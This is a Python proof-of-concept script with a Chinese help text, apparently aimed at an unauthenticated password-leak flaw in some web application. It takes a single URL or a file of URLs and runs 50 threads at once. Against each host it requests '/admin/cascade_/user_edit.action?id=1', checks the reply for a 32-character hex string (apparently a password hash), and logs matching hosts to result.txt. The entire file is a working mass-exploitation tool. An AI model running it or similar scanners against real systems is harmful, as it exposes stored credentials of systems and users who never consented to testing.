import requests,sys,argparse,json,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def bb():
    tt="""|~\|_|  |~\(~(~      _ _._   _ _|o_|_   _  __|_o _ ._   |._  |~ _ ._._ _  _ _|_o _ ._    _|o _ _| _  _   ._ _
|_/| |~~|_/_)_)~~|_|_\}_| __}_(_|| | __(_|(_ | |(_)| |~~|| |~|~(_)| | | |(_| | |(_)| |~~(_||_\(_|(_)_\|_|| }_
"""
    print(tt)

def main():
    bb()
    parser=argparse.ArgumentParser(description="脚本脚本")
    parser.add_argument('-u','--url',dest='url',type=str,help='输入URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='导入文件')
    args=parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    if args.file and not args.url:
        url_list=[]
        with open(args.file,mode='r',encoding='utf-8')as f1:
            for i in f1.readlines():
                url_list.append(i.strip())
        mp =Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload='/admin/cascade_/user_edit.action?id=1'
    regex_patterns = ['[0-9a-f]{32}']
    try:
        req1=requests.get(url=target+payload)
        for pattern in regex_patterns:
            if re.search(pattern, req1.text):
                print(f"[+++]{target}")
                with open('result.txt',mode='a')as f2:
                    f2.write(target+'\n')
            else:
                print(f'[-]{target}')
    except:
        pass
    
if __name__ == '__main__':
    main()
